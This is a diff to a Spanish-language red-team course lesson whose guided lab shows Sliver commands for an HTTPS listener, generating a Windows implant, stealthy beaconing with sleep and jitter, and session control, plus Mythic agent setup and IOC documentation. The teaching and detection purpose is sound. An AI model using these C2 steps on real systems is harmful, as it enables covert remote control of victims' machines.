@@ -53,25 +53,33 @@ Al finalizar, el alumno podrá:
 ## 🧪 Laboratorio guiado
 
 1. **Instala Sliver** y entra en la consola:
+
    ```bash
    sliver
    sliver > https --lhost 0.0.0.0 --lport 443   # levanta un listener HTTPS
    ```
+
 2. **Genera un implante:**
+
    ```bash
    sliver > generate --http tu-redirector.lab --os windows --arch amd64 --save /tmp/
    ```
+
    Entrega el binario a una VM Windows de tu lab y ejecútalo.
 3. **Interactúa con la sesión:**
+
    ```bash
    sliver > sessions
    sliver > use <session-id>
    sliver (SESSION) > info; ps; ls
    ```
+
 4. **Ajusta sigilo:** configura `beacon` con sleep y jitter:
+
    ```bash
    sliver > generate beacon --http tu-redirector.lab --seconds 60 --jitter 30
    ```
+
 5. **Despliega Mythic** con Docker y crea un operador; instala un agente (ej. Apollo o Poseidon) desde `mythic-cli install github ...`.
 6. **Compara telemetría.** En la VM víctima observa procesos, conexiones (`netstat`) y, si tienes Sysmon (Parte 8), los eventos que generan Sliver vs Mythic.
 7. **Documenta IOCs.** Anota puertos, User-Agents por defecto, nombres de proceso y patrones de beaconing detectables.
@@ -113,10 +121,10 @@ HTTPS con perfil realista para trabajo diario; mTLS para robustez interna del la
 
 ## 🔗 Referencias
 
-- Sliver (BishopFox). https://github.com/BishopFox/sliver · https://sliver.sh/
-- Mythic. https://github.com/its-a-feature/Mythic · https://docs.mythic-c2.net/
+- Sliver (BishopFox). <https://github.com/BishopFox/sliver> · <https://sliver.sh/>
+- Mythic. <https://github.com/its-a-feature/Mythic> · <https://docs.mythic-c2.net/>
 - Bryant, T. — *Operator Handbook*.
-- MITRE ATT&CK — *Application Layer Protocol* (`T1071`). https://attack.mitre.org/techniques/T1071/
+- MITRE ATT&CK — *Application Layer Protocol* (`T1071`). <https://attack.mitre.org/techniques/T1071/>
 
 ## ➡️ Siguiente clase
 
